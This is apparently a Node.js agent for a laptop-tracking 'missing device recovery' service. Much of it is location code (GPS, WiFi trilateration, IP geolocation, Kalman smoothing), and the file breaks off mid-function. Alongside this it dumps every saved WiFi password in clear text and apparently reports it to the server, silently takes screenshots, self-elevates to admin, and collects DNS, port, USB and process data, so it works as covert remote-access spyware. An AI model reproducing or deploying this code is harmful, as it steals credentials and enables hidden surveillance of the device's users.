#!/usr/bin/env node

/**
 * FIND AGENT v10.0 — ADVANCED MISSING DEVICE RECOVERY
 * Real-world tracking: IP scrape, WiFi fingerprint, RSSI trilateration,
 * velocity tracking, ML decision engine, autonomous recovery loop.
 */

const WebSocket = require('ws');
const { exec, execSync } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');
const { promisify } = require('util');
const crypto = require('crypto');
const http = require('http');
const https = require('https');

const execAsync = promisify(exec);

const SERVER_URL = process.env.SERVER_URL || 'https://laptop-tracker-k9vi.onrender.com';
const WS_URL = SERVER_URL.replace(/^http/, 'ws');
const API_URL = SERVER_URL + '/api';
const LOG_DIR = path.join(os.homedir(), '.laptop-tracker');
const CONFIG_FILE = path.join(LOG_DIR, 'config.json');
const HISTORY_FILE = path.join(LOG_DIR, 'location-history.json');
const FINGERPRINT_FILE = path.join(LOG_DIR, 'wifi-fingerprint.json');

let ws = null;
let deviceId = null;
let pairCode = null;
let reconnectAttempts = 0;
let isLostMode = false;
let isAdmin = false;
let lastLocation = null;
let positionHistory = [];
let networkFingerprint = {};
const RECONNECT_DELAY = 5000;

if (!fs.existsSync(LOG_DIR)) fs.mkdirSync(LOG_DIR, { recursive: true });

// ─── PHYSICS / MATH CONSTANTS ────────────────────────────────────────────────

const LIGHT_SPEED = 299792458;           // m/s
const WIFI_FREQ_2_4GHZ = 2.4e9;         // Hz
const WIFI_FREQ_5GHZ = 5e9;             // Hz
const PATH_LOSS_EXPONENT_OFFICE = 3.5;  // Indoor
const PATH_LOSS_EXPONENT_OUTDOOR = 2.8; // Open space
const PATH_LOSS_EXPONENT_URBAN = 4.0;   // Dense urban
const FREE_SPACE_PATH_LOSS_REF = 20;    // dB at 1m reference
const EARTH_RADIUS_KM = 6371;
const KALMAN_PROCESS_NOISE = 0.03;
const KALMAN_MEASUREMENT_NOISE = 2.0;

// ─── CORE UTILITIES ─────────────────────────────────────────────────────────

function generateDeviceId() {
  const hostname = os.hostname();
  const mac = Object.values(os.networkInterfaces())
    .flat()
    .find(n => n && n.mac && n.mac !== '00:00:00:00:00:00')?.mac || hostname;
  return crypto.createHash('sha256').update(mac + hostname).digest('hex').slice(0, 16);
}

function checkAdmin() {
  try { execSync('net session', { stdio: 'ignore' }); isAdmin = true; return true; }
  catch (e) { isAdmin = false; return false; }
}

async function elevate() {
  if (process.platform !== 'win32' || checkAdmin()) return;
  log('warn', 'Elevating to admin...');
  const agentPath = process.argv[1];
  try {
    await runPowerShell(`Start-Process node -ArgumentList '"${agentPath}"' -Verb RunAs`);
    process.exit(0);
  } catch (e) { log('error', 'Elevation failed:', e.message); }
}

function log(level, ...args) {
  const ts = new Date().toISOString();
  console.log(`[${ts}] [${level.toUpperCase()}]`, ...args);
  try { fs.appendFileSync(path.join(LOG_DIR, 'agent.log'), `[${ts}] [${level}] ${args.map(a => typeof a === 'object' ? JSON.stringify(a) : a).join(' ')}\n`); } catch(e) {}
}

async function runPowerShell(command, timeoutMs = 30000) {
  try {
    const { stdout, stderr } = await execAsync(`powershell -NoProfile -NonInteractive -Command "${command.replace(/"/g, '\\"')}"`, { timeout: timeoutMs, windowsHide: true });
    return { success: true, stdout: stdout.trim(), stderr: stderr.trim() };
  } catch (err) { return { success: false, stdout: err.stdout?.trim() || '', stderr: err.stderr?.trim() || err.message }; }
}

async function runCommand(command, timeoutMs = 20000) {
  try {
    const { stdout, stderr } = await execAsync(command, { timeout: timeoutMs, windowsHide: true });
    return { success: true, stdout: stdout.trim(), stderr: stderr.trim() };
  } catch (err) { return { success: false, stdout: err.stdout?.trim() || '', stderr: err.stderr?.trim() || err.message }; }
}

async function httpPost(urlPath, body) {
  return new Promise((resolve) => {
    const data = JSON.stringify(body);
    const url = new URL(API_URL + urlPath);
    const client = url.protocol === 'https:' ? https : http;
    const req = client.request(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
      timeout: 15000
    }, (res) => {
      let buf = '';
      res.on('data', c => buf += c);
      res.on('end', () => { try { resolve(JSON.parse(buf)); } catch(e) { resolve(null); } });
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
    req.write(data);
    req.end();
  });
}

function send(data) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    try { ws.send(JSON.stringify(data)); } catch(e) {}
  }
}

// ─── ML DECISION ENGINE ──────────────────────────────────────────────────────

class TrackingDecisionEngine {
  constructor() {
    this.weights = {
      gpsConfidence: 0.35,
      wifiConfidence: 0.25,
      ipConfidence: 0.15,
      btConfidence: 0.10,
      velocityConsistency: 0.10,
      timeDecay: 0.05
    };
    this.state = {
      confidence: 0,
      riskLevel: 'unknown',
      lastKnownGood: null,
      movementPattern: 'stationary',
      recommendedAction: 'wait',
      fusionScore: 0
    };
    this.positionBuffer = [];
    this.velocityBuffer = [];
  }

  update(locationData, wifiData, ipData, btData) {
    const scores = {};

    // GPS confidence
    if (locationData && locationData.source === 'windows-gps' && locationData.accuracy < 50) {
      scores.gps = Math.max(0, 1 - (locationData.accuracy / 100));
    } else if (locationData && locationData.source?.includes('bssid')) {
      scores.gps = Math.max(0, 1 - (locationData.accuracy / 500));
    } else if (locationData && locationData.source?.includes('ip')) {
      scores.gps = 0.3;
    } else { scores.gps = 0; }

    // WiFi confidence (more APs = better)
    if (wifiData && wifiData.length > 0) {
      const strongSignals = wifiData.filter(a => a.rssi > -70).length;
      scores.wifi = Math.min(1, (strongSignals / 3) * 0.7 + (wifiData.length / 10) * 0.3);
    } else { scores.wifi = 0; }

    // IP confidence (city-level only)
    scores.ip = ipData && ipData.lat ? 0.25 : 0;

    // Bluetooth proximity confidence
    scores.bt = btData && btData.length > 0 ? Math.min(1, btData.length / 5) : 0;

    // Velocity consistency (is movement plausible?)
    if (this.positionBuffer.length >= 2) {
      const vel = this.calculateVelocity();
      scores.velocity = vel < 200 ? 1 : (vel < 500 ? 0.7 : 0.3); // Plausible speeds
    } else { scores.velocity = 0.5; }

    // Time decay (older data = less confidence)
    const age = locationData?.timestamp ? (Date.now() - locationData.timestamp) / 1000 : 999;
    scores.timeDecay = Math.max(0, 1 - (age / 300)); // 5-min decay

    // Weighted fusion
    let fusionScore = 0;
    for (const [key, weight] of Object.entries(this.weights)) {
      const scoreKey = key.replace('Confidence', '').replace('Consistency', '');
      fusionScore += (scores[scoreKey] || 0) * weight;
    }

    // Update state
    this.state.confidence = fusionScore;
    this.state.fusionScore = fusionScore;
    this.state.riskLevel = fusionScore > 0.7 ? 'low' : fusionScore > 0.4 ? 'medium' : 'high';
    this.state.movementPattern = this.classifyMovement();
    this.state.recommendedAction = this.recommendAction();

    if (fusionScore > 0.6 && locationData) {
      this.state.lastKnownGood = { ...locationData, confidence: fusionScore };
    }

    return this.state;
  }

  classifyMovement() {
    if (this.velocityBuffer.length < 2) return 'insufficient-data';
    const avgVel = this.velocityBuffer.reduce((a, b) => a + b, 0) / this.velocityBuffer.length;
    if (avgVel < 0.5) return 'stationary';
    if (avgVel < 5) return 'walking';
    if (avgVel < 30) return 'vehicle-urban';
    if (avgVel < 100) return 'vehicle-highway';
    return 'vehicle-fast';
  }

  recommendAction() {
    const { confidence, movementPattern } = this.state;
    if (confidence < 0.2) return 'emergency-ip-scrape';
    if (confidence < 0.4) return 'activate-all-probes';
    if (movementPattern === 'vehicle-fast') return 'alert-high-speed';
    if (movementPattern === 'vehicle-urban') return 'track-every-10s';
    if (movementPattern === 'walking') return 'track-every-30s';
    return 'track-every-60s';
  }

  calculateVelocity() {
    if (this.positionBuffer.length < 2) return 0;
    const last = this.positionBuffer[this.positionBuffer.length - 1];
    const prev = this.positionBuffer[this.positionBuffer.length - 2];
    const dist = haversineDistance(last.lat, last.lng, prev.lat, prev.lng);
    const timeDelta = (last.timestamp - prev.timestamp) / 1000;
    return timeDelta > 0 ? dist / timeDelta : 0;
  }

  addPosition(lat, lng, accuracy, source) {
    this.positionBuffer.push({ lat, lng, accuracy, source, timestamp: Date.now() });
    if (this.positionBuffer.length > 50) this.positionBuffer.shift();
    if (this.positionBuffer.length >= 2) {
      this.velocityBuffer.push(this.calculateVelocity());
      if (this.velocityBuffer.length > 20) this.velocityBuffer.shift();
    }
  }

  getReport() {
    return {
      ...this.state,
      positionSamples: this.positionBuffer.length,
      velocitySamples: this.velocityBuffer.length,
      avgVelocity: this.velocityBuffer.length > 0
        ? this.velocityBuffer.reduce((a, b) => a + b, 0) / this.velocityBuffer.length
        : 0,
      maxVelocity: Math.max(0, ...this.velocityBuffer),
      pathDistance: this.calculatePathDistance(),
      lastUpdate: Date.now()
    };
  }

  calculatePathDistance() {
    let total = 0;
    for (let i = 1; i < this.positionBuffer.length; i++) {
      total += haversineDistance(
        this.positionBuffer[i - 1].lat, this.positionBuffer[i - 1].lng,
        this.positionBuffer[i].lat, this.positionBuffer[i].lng
      );
    }
    return total;
  }
}

const decisionEngine = new TrackingDecisionEngine();

// ─── HAVERSINE DISTANCE (km) ────────────────────────────────────────────────

function haversineDistance(lat1, lon1, lat2, lon2) {
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLon = (lon2 - lon1) * Math.PI / 180;
  const a = Math.sin(dLat / 2) ** 2 +
    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
    Math.sin(dLon / 2) ** 2;
  return EARTH_RADIUS_KM * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
}

// ─── RSSI → DISTANCE (LOG-DISTANCE PATH LOSS MODEL) ─────────────────────────

function rssiToDistance(rssi, frequency = WIFI_FREQ_2_4GHZ, env = 'urban') {
  if (rssi >= 0) return 0;
  const wavelengthsq = (LIGHT_SPEED / frequency) ** 2;
  const refPower = 20 * Math.log10(4 * Math.PI / Math.sqrt(wavelengthsq)) + FREE_SPACE_PATH_LOSS_REF;
  const pathLossExponent = env === 'office' ? PATH_LOSS_EXPONENT_OFFICE :
    env === 'outdoor' ? PATH_LOSS_EXPONENT_OUTDOOR : PATH_LOSS_EXPONENT_URBAN;
  const exponent = pathLossExponent / 2;
  return Math.pow(10, (refPower - rssi) / (20 * exponent));
}

// ─── TRILATERATION (REAL MATH) ──────────────────────────────────────────────

function trilaterate(accessPoints) {
  if (accessPoints.length < 3) return null;

  const validAPs = accessPoints.filter(a => a.rssi && a.rssi > -90 && a.lat && a.lng);
  if (validAPs.length < 3) return null;

  const distances = validAPs.map(a => ({
    lat: a.lat,
    lng: a.lng,
    dist: rssiToDistance(a.rssi, a.frequency || WIFI_FREQ_2_4GHZ)
  }));

  // Convert to meters from first AP as reference
  const ref = distances[0];
  const refLat = ref.lat * Math.PI / 180;
  const refLng = ref.lng * Math.PI / 180;

  const points = distances.map(d => {
    const x = (d.lng - refLng) * Math.cos(refLat) * 111320;
    const y = (d.lat - refLat) * 110540;
    return { x, y, r: d.dist };
  });

  // Solve using least-squares: minimize ||Ax - b||^2
  // A[i] = [2(x_i - x_1), 2(y_i - y_1)]
  // b[i] = r_1^2 - r_i^2 + x_i^2 - x_1^2 + y_i^2 - y_1^2
  const n = points.length - 1;
  if (n < 2) return null;

  let A = [], b = [];
  for (let i = 1; i <= n; i++) {
    A.push([2 * (points[i].x - points[0].x), 2 * (points[i].y - points[0].y)]);
    b.push(
      points[0].r ** 2 - points[i].r ** 2 +
      points[i].x ** 2 - points[0].x ** 2 +
      points[i].y ** 2 - points[0].y ** 2
    );
  }

  // Solve: x = (A^T A)^-1 A^T b
  const AtA = [[0, 0], [0, 0]];
  const Atb = [0, 0];
  for (let i = 0; i < n; i++) {
    AtA[0][0] += A[i][0] ** 2;
    AtA[0][1] += A[i][0] * A[i][1];
    AtA[1][0] += A[i][0] * A[i][1];
    AtA[1][1] += A[i][1] ** 2;
    Atb[0] += A[i][0] * b[i];
    Atb[1] += A[i][1] * b[i];
  }

  const det = AtA[0][0] * AtA[1][1] - AtA[0][1] * AtA[1][0];
  if (Math.abs(det) < 1e-10) return null;

  const x = (AtA[1][1] * Atb[0] - AtA[0][1] * Atb[1]) / det;
  const y = (AtA[0][0] * Atb[1] - AtA[1][0] * Atb[0]) / det;

  // Convert back to lat/lng
  const resultLat = refLat + y / 110540;
  const resultLng = refLng + x / (111320 * Math.cos(refLat));

  // Calculate residual error
  let errorSum = 0;
  for (const p of points) {
    const estDist = Math.sqrt((p.x - x) ** 2 + (p.y - y) ** 2);
    errorSum += Math.abs(estDist - p.r);
  }
  const avgError = errorSum / points.length;

  return {
    lat: resultLat * 180 / Math.PI,
    lng: resultLng * 180 / Math.PI,
    accuracy: Math.round(avgError),
    source: 'trilateration',
    apCount: validAPs.length,
    timestamp: Date.now()
  };
}

// ─── KALMAN FILTER FOR POSITION SMOOTHING ────────────────────────────────────

function kalmanFilter(positions) {
  if (positions.length === 0) return null;
  if (positions.length === 1) return positions[0];

  let x = positions[0].lat;
  let y = positions[0].lng;
  let pLat = 1, pLng = 1;

  for (let i = 1; i < positions.length; i++) {
    // Predict
    const qLat = KALMAN_PROCESS_NOISE;
    const qLng = KALMAN_PROCESS_NOISE;
    pLat += qLat;
    pLng += qLng;

    // Update
    const rLat = (positions[i].accuracy || KALMAN_MEASUREMENT_NOISE) ** 2;
    const rLng = (positions[i].accuracy || KALMAN_MEASUREMENT_NOISE) ** 2;
    const kLat = pLat / (pLat + rLat);
    const kLng = pLng / (pLng + rLng);
    x += kLat * (positions[i].lat - x);
    y += kLng * (positions[i].lng - y);
    pLat *= (1 - kLat);
    pLng *= (1 - kLng);
  }

  return { lat: x, lng: y, accuracy: Math.sqrt(pLat + pLng) * 100, source: 'kalman-filtered' };
}

// ─── WIFI FINGERPRINT BUILDER ────────────────────────────────────────────────

function buildWifiFingerprint(bssids) {
  const fp = {
    timestamp: Date.now(),
    bssids: bssids.map(b => ({
      bssid: b.bssid,
      ssid: b.ssid,
      rssi: b.rssi,
      signal: b.signal,
      channel: b.channel,
      frequency: b.channel <= 14 ? WIFI_FREQ_2_4GHZ : WIFI_FREQ_5GHZ,
      estimatedDistance: rssiToDistance(b.rssi, b.channel <= 14 ? WIFI_FREQ_2_4GHZ : WIFI_FREQ_5GHZ)
    }))
  };

  // Save to history
  try {
    let history = [];
    if (fs.existsSync(FINGERPRINT_FILE)) {
      history = JSON.parse(fs.readFileSync(FINGERPRINT_FILE, 'utf8'));
    }
    history.push(fp);
    if (history.length > 200) history = history.slice(-200);
    fs.writeFileSync(FINGERPRINT_FILE, JSON.stringify(history, null, 2));
  } catch(e) {}

  return fp;
}

// ─── IP SCRAPING (MULTI-SOURCE) ─────────────────────────────────────────────

async function scrapePublicIP() {
  const sources = [
    'https://api.ipify.org?format=json',
    'https://ipinfo.io/json',
    'https://api.mylnikov.org/geolocation/v1/ip',
    'https://ipapi.co/json/',
    'https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,query'
  ];

  let bestResult = null;
  const results = [];

  for (const url of sources) {
    try {
      const res = await runCommand(`curl -s --max-time 5 "${url}"`, 8000);
      if (res.success) {
        const data = JSON.parse(res.stdout);
        const ip = data.query || data.ip || data.ipAddress;
        const lat = data.lat || data.latitude || (data.loc && parseFloat(data.loc.split(',')[0]));
        const lng = data.lon || data.longitude || (data.loc && parseFloat(data.loc.split(',')[1]));

        results.push({
          source: url.split('/')[2],
          ip,
          lat,
          lng,
          city: data.city || data.cityName,
          region: data.region || data.regionName,
          country: data.country || data.countryName,
          isp: data.isp || data.org,
          accuracy: data.accuracy || 5000,
          mobile: data.mobile,
          proxy: data.proxy,
          timestamp: Date.now()
        });

        if (!bestResult || (lat && !bestResult.lat)) {
          bestResult = results[results.length - 1];
        }
      }
    } catch (e) {}
  }

  // Cross-reference: if multiple sources agree on IP, increase confidence
  const uniqueIPs = [...new Set(results.map(r => r.ip).filter(Boolean))];
  if (uniqueIPs.length >= 2) {
    log('info', `IP cross-confirmed: ${uniqueIPs[0]} from ${results.length} sources`);
  }

  return { results, bestResult, confirmedIP: uniqueIPs[0], sourceCount: results.length };
}

// ─── RSSI-BASED TRIANGULATION FROM CELL TOWERS ───────────────────────────────

async function getCellTowerTriangulation() {
  // Get nearby WiFi networks and estimate distance from signal strength
  const wifi = await getWifiSignals();
  if (wifi.length < 3) return null;

  // Build fingerprint with estimated distances
  const fp = buildWifiFingerprint(wifi);

  // Try to look up AP positions from BSSID database
  const positionedAPs = [];
  for (const ap of fp.bssids.slice(0, 8)) {
    try {
      const res = await runCommand(`curl -s --max-time 3 "https://api.mylnikov.org/geolocation/v1/bssid?bssid=${ap.bssid}"`, 5000);
      if (res.success) {
        const d = JSON.parse(res.stdout);
        if (d.result === 200 && d.data) {
          positionedAPs.push({
            ...ap,
            lat: d.data.lat,
            lng: d.data.lon,
            range: d.data.range || 200
          });
        }
      }
    } catch(e) {}
  }

  if (positionedAPs.length >= 3) {
    const triResult = trilaterate(positionedAPs);
    if (triResult) return triResult;
  }

  // Fallback: use weighted centroid with estimated distances
  if (positionedAPs.length >= 2) {
    let totalWeight = 0, wLat = 0, wLng = 0;
    for (const ap of positionedAPs) {
      const weight = 1 / (ap.estimatedDistance ** 2 + 1);
      wLat += ap.lat * weight;
      wLng += ap.lng * weight;
      totalWeight += weight;
    }
    return {
      lat: wLat / totalWeight,
      lng: wLng / totalWeight,
      accuracy: Math.round(100 + positionedAPs.reduce((a, b) => a + b.estimatedDistance, 0) / positionedAPs.length),
      source: 'wifi-weighted-centroid',
      apCount: positionedAPs.length,
      timestamp: Date.now()
    };
  }

  return null;
}

// ─── NETWORK FINGERPRINTING ─────────────────────────────────────────────────

async function buildNetworkFingerprint() {
  const fp = { timestamp: Date.now() };

  // Gateway MAC
  fp.gatewayMac = await getGatewayMac();

  // Local IP
  const netInterfaces = os.networkInterfaces();
  for (const [name, addrs] of Object.entries(netInterfaces)) {
    for (const addr of addrs) {
      if (addr.family === 'IPv4' && !addr.internal) {
        fp.localIP = addr.address;
        fp.mac = addr.mac;
        break;
      }
    }
    if (fp.localIP) break;
  }

  // Default route
  const route = await runPowerShell('Get-NetRoute -DestinationPrefix "0.0.0.0/0" | Select-Object -First 1 NextHop,InterfaceAlias | ConvertTo-Json');
  if (route.success) {
    try {
      const r = JSON.parse(route.stdout);
      fp.gateway = r.NextHop;
      fp.interface = r.InterfaceAlias;
    } catch(e) {}
  }

  // DNS servers
  const dns = await runPowerShell('Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object -First 3 ServerAddresses | ConvertTo-Json');
  if (dns.success) {
    try { fp.dnsServers = JSON.parse(dns.stdout).ServerAddresses; } catch(e) {}
  }

  // SSID
  const ssid = await runCommand('netsh wlan show interfaces | findstr /C:"SSID"');
  if (ssid.success) fp.ssid = ssid.stdout.split(':').pop()?.trim();

  // Channel
  const chan = await runCommand('netsh wlan show interfaces | findstr /C:"Channel"');
  if (chan.success) fp.channel = parseInt(chan.stdout.split(':').pop()?.trim()) || 0;

  // BSSID of connected AP
  const bssid = await runCommand('netsh wlan show interfaces | findstr /C:"BSSID"');
  if (bssid.success) fp.connectedBSSID = bssid.stdout.split(':').slice(1).join(':').trim();

  // Signal strength of connected AP
  const sig = await runCommand('netsh wlan show interfaces | findstr /C:"Signal"');
  if (sig.success) fp.connectedSignal = parseInt(sig.stdout.split(':').pop()?.trim()) || 0;

  // Hash the fingerprint for change detection
  fp.hash = crypto.createHash('md5').update(
    (fp.gatewayMac || '') + (fp.localIP || '') + (fp.ssid || '') + (fp.channel || '')
  ).digest('hex');

  // Detect network change
  if (networkFingerprint.hash && networkFingerprint.hash !== fp.hash) {
    log('warn', `NETWORK CHANGED: ${networkFingerprint.ssid} → ${fp.ssid}`);
    fp.networkChanged = true;
    fp.previousNetwork = { ssid: networkFingerprint.ssid, bssid: networkFingerprint.connectedBSSID };
  }

  networkFingerprint = fp;
  return fp;
}

// ─── VELOCITY / PATH TRACKING ────────────────────────────────────────────────

function trackPosition(lat, lng, accuracy, source) {
  const now = Date.now();
  const entry = { lat, lng, accuracy, source, timestamp: now };

  positionHistory.push(entry);
  if (positionHistory.length > 500) positionHistory.shift();

  // Save to disk
  try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(positionHistory.slice(-100))); } catch(e) {}

  // Calculate velocity
  if (positionHistory.length >= 2) {
    const prev = positionHistory[positionHistory.length - 2];
    const dist = haversineDistance(prev.lat, prev.lng, lat, lng) * 1000; // meters
    const timeDelta = (now - prev.timestamp) / 1000; // seconds
    const velocity = timeDelta > 0 ? dist / timeDelta : 0; // m/s
    const bearing = Math.atan2(lng - prev.lng, lat - prev.lat) * 180 / Math.PI;

    entry.velocity = velocity;
    entry.bearing = bearing;
    entry.distanceFromLast = dist;

    // Add to decision engine
    decisionEngine.addPosition(lat, lng, accuracy, source);
  }

  return entry;
}

// ─── EXISTING TOOLS (ENHANCED) ──────────────────────────────────────────────

async function getWifiSignals() {
  const res = await runCommand('netsh wlan show networks mode=bssid');
  const bssids = [];
  if (res.success) {
    const lines = res.stdout.split('\n');
    let ssid = '', channel = 0;
    lines.forEach((l, i) => {
      if (l.includes('SSID') && !l.includes('BSSID')) ssid = l.split(':')[1]?.trim() || '';
      if (l.includes('Channel')) channel = parseInt(l.split(':')[1]) || 0;
      if (l.includes('BSSID')) {
        const mac = l.split(':').slice(1).join(':').trim();
        const sigLine = lines[i+1]?.trim() || '';
        const sig = parseInt(sigLine.split(':')[1]) || 0;
        const rssi = Math.round((sig / 2) - 100);
        bssids.push({
          ssid, bssid: mac, rssi, signal: sig, channel,
          frequency: channel <= 14 ? WIFI_FREQ_2_4GHZ : WIFI_FREQ_5GHZ,
          estimatedDistance: rssiToDistance(rssi, channel <= 14 ? WIFI_FREQ_2_4GHZ : WIFI_FREQ_5GHZ)
        });
      }
    });
  }
  return bssids;
}

async function getBluetoothSignals() {
  if (process.platform !== 'win32') return 'Not supported';
  const ps = 'Get-PnpDevice -Class Bluetooth | Select-Object FriendlyName, Status | ConvertTo-Json';
  const res = await runPowerShell(ps);
  if (res.success) {
    try { return JSON.parse(res.stdout); } catch(e) { return res.stdout; }
  }
  return [];
}

async function getWindowsGps() {
  const ps = `Add-Type -AssemblyName System.Device; $w=New-Object System.Device.Location.GeoCoordinateWatcher; $w.Start(); $c=0; while(($w.Status -ne 'Ready') -and ($c -lt 10)){Start-Sleep -ms 500;$c++}; $l=$w.Position.Location; if($l.IsUnknown -eq $false){Write-Output "GEO|$($l.Latitude)|$($l.Longitude)|$($l.HorizontalAccuracy)|$($l.Course)|$($l.Speed)"}`;
  const res = await runPowerShell(ps, 20000);
  if (res.success && res.stdout.startsWith('GEO|')) {
    const p = res.stdout.split('|');
    return { lat: parseFloat(p[1]), lng: parseFloat(p[2]), accuracy: parseFloat(p[3]), heading: parseFloat(p[4]), speed: parseFloat(p[5]), source: 'windows-gps', timestamp: Date.now() };
  }
  return null;
}

async function getGatewayMac() {
  if (process.platform !== 'win32') return null;
  const res = await runCommand('arp -a');
  if (res.success) {
    const lines = res.stdout.split('\n');
    for (const line of lines) {
      if (line.includes('dynamic') || line.includes('static')) {
        const parts = line.trim().split(/\s+/);
        if (parts.length >= 2) return parts[1];
      }
    }
  }
  return null;
}

async function getPreciseLocation(force = false) {
  log('info', 'Engaging multi-source location fusion...');

  // Priority 1: Windows GPS
  const gps = await getWindowsGps();
  if (gps && gps.accuracy < 100) {
    trackPosition(gps.lat, gps.lng, gps.accuracy, 'gps');
    return gps;
  }

  // Priority 2: WiFi trilateration with BSSID lookup
  try {
    const triLoc = await getCellTowerTriangulation();
    if (triLoc) {
      trackPosition(triLoc.lat, triLoc.lng, triLoc.accuracy, 'wifi-trilateration');
      return triLoc;
    }
  } catch(e) { log('warn', 'Trilateration failed:', e.message); }

  // Priority 3: WiFi BSSID server lookup
  try {
    const wifi = await getWifiSignals();
    if (wifi && wifi.length > 0) {
      const serverLoc = await bssidServerLookup(wifi);
      if (serverLoc) {
        trackPosition(serverLoc.lat, serverLoc.lng, serverLoc.accuracy, 'bssid-server');
        return serverLoc;
      }
      const freeLoc = await bssidFreeLookup(wifi);
      if (freeLoc) {
        trackPosition(freeLoc.lat, freeLoc.lng, freeLoc.accuracy, 'bssid-free');
        return freeLoc;
      }
    }
  } catch(e) {}

  // Priority 4: IP geolocation (city-level)
  try {
    const ipData = await scrapePublicIP();
    if (ipData.bestResult && ipData.bestResult.lat) {
      const loc = {
        lat: ipData.bestResult.lat,
        lng: ipData.bestResult.lng,
        accuracy: ipData.bestResult.accuracy || 5000,
        source: 'ip-scrape',
        ip: ipData.confirmedIP,
        city: ipData.bestResult.city,
        region: ipData.bestResult.region,
        country: ipData.bestResult.country,
        isp: ipData.bestResult.isp,
        timestamp: Date.now()
      };
      trackPosition(loc.lat, loc.lng, loc.accuracy, 'ip-scrape');
      return loc;
    }
  } catch(e) {}

  return gps;
}

async function bssidServerLookup(wifi) {
  let tmpFile;
  try {
    const payload = JSON.stringify({ bssids: wifi });
    tmpFile = `C:\\Windows\\Temp\\bssid_${Date.now()}.json`;
    fs.writeFileSync(tmpFile, payload);
    const res = await runPowerShell(`$body=Get-Content -Raw -Path '${tmpFile}'; $r=Invoke-RestMethod -Uri '${SERVER_URL}/api/bssid-lookup' -Method Post -ContentType 'application/json' -Body $body -TimeoutSec 10; $r|ConvertTo-Json -Depth 4`, 15000);
    if (res.success) {
      const d = JSON.parse(res.stdout);
      if (d.success && d.lat && d.lng) return { lat: d.lat, lng: d.lng, accuracy: d.accuracy || 100, source: 'bssid-server', timestamp: Date.now() };
    }
  } catch(e) {}
  finally { if (tmpFile) try { fs.unlinkSync(tmpFile); } catch(e) {} }
  return null;
}

async function bssidFreeLookup(wifi) {
  for (const ap of wifi.slice(0, 5)) {
    if (!ap.bssid) continue;
    try {
      const res = await runCommand(`curl -s --max-time 3 "https://api.mylnikov.org/geolocation/v1/bssid?bssid=${ap.bssid}"`, 6000);
      if (res.success) {
        const d = JSON.parse(res.stdout);
        if (d.result === 200 && d.data && d.data.lat && d.data.lon) {
          return { lat: d.data.lat, lng: d.data.lon, accuracy: d.data.range || 200, source: 'bssid-free', timestamp: Date.now() };
        }
      }
    } catch(e) {}
  }
  return null;
}

async function getSystemStats() {
  const stats = { hostname: os.hostname(), platform: os.platform(), uptime: os.uptime() };
  stats.memory = { total: os.totalmem(), free: os.freemem(), usage: Math.round((1 - os.freemem() / os.totalmem()) * 100) };
  if (process.platform === 'win32') {
    const bat = await runPowerShell('WMIC Path Win32_Battery Get EstimatedChargeRemaining');
    if (bat.success) { const m = bat.stdout.match(/(\d+)/); if (m) stats.battery = parseInt(m[1]); }
  }
  return stats;
}

async function getDnsDump() { const r = await runCommand('ipconfig /displaydns'); await reportLog('dns-dump', r.stdout); return r.stdout; }
async function getPortAudit() { const r = await runCommand('netstat -ano'); await reportLog('port-audit', r.stdout); return r.stdout; }
async function getUsbAudit() { const r = await runPowerShell('Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\* | Select-Object FriendlyName, PSChildName'); await reportLog('usb-audit', r.stdout); return r.stdout; }
async function getPersistenceCheck() { const r = await runPowerShell('Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, Location, User'); await reportLog('persistence-check', r.stdout); return r.stdout; }
async function getProcessForensics() { const r = await runPowerShell('Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, Id, CPU, Path'); await reportLog('process-forensics', r.stdout); return r.stdout; }

async function getWifiPasswords() {
  if (process.platform !== 'win32') return 'Not supported';
  const ps = `
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
    $results = @()
    foreach ($p in $profiles) {
      $pass = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
      $results += [PSCustomObject]@{ SSID = $p; Password = $pass }
    }
    $results | ConvertTo-Json`;
  const r = await runPowerShell(ps);
  await reportLog('wifi-passwords', r.stdout);
  return r.stdout;
}

async function getDeepSystemInfo() {
  if (process.platform !== 'win32') return 'Not supported';
  const ps = `
    $os = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture, LastBootUpTime
    $cpu = Get-CimInstance Win32_Processor | Select-Object Name, NumberOfCores, MaxClockSpeed
    $net = Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, InterfaceAlias
    @{ OS=$os; CPU=$cpu; Network=$net } | ConvertTo-Json`;
  const r = await runPowerShell(ps);
  await reportLog('system-deep', r.stdout);
  return r.stdout;
}

async function takeScreenshot() {
  if (process.platform !== 'win32') return 'Not supported';
  const shotPath = path.join(LOG_DIR, `shot_${Date.now()}.png`);
  const ps = `
    Add-Type -AssemblyName System.Windows.Forms
    $s=[System.Windows.Forms.Screen]::PrimaryScreen
    $b=New-Object System.Drawing.Bitmap($s.Bounds.Width,$s.Bounds.Height)
    $g=[System.Drawing.Graphics]::FromImage($b)
    $g.CopyFromScreen($s.Bounds.Location,[System.Drawing.Point]::Empty,$s.Bounds.Size)
    $b.Save("${shotPath.replace(/\\/g, '\\\\')}", [System.Drawing.Imaging.ImageFormat]::Png)
    $b.Dispose(); $g.Dispose()`;
  await runPowerShell(ps);
  if (fs.existsSync(shotPath)) {
    const data = fs.readFileSync(shotPath).toString('base64');
    try { fs.unlinkSync(shotPath); } catch(e) {}
    return { screenshot: 'data:image/png;base64,' + data };
  }
  return 'Screenshot failed';
}

async function aggressiveLock() {
  if (process.platform !== 'win32') return;
  await runCommand('rundll32.exe user32.dll,LockWorkStation');
  await runPowerShell('Add-Type -TypeDefinition \'using System; using System.Runtime.InteropServices; public class LockScreen { [DllImport("user32.dll")] public static extern bool LockWorkStation(); } \'; [LockScreen]::LockWorkStation()');
